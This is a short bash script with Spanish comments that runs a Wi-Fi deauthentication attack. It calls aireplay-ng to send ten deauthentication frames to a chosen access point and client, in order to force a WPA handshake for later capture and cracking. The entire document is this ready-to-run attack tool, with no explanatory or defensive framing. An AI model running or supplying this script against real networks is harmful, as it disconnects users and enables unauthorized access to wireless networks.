#!/bin/bash
# Realiza un ataque de desautenticación para forzar el handshake

BSSID=$1
CLIENT_MAC=$2
INTERFACE=wlan0mon

if [ -z "$BSSID" ] || [ -z "$CLIENT_MAC" ]; then
  echo "Uso: $0 <BSSID> <MAC del Cliente>"
  exit 1
fi

sudo aireplay-ng --deauth 10 -a $BSSID -c $CLIENT_MAC $INTERFACE
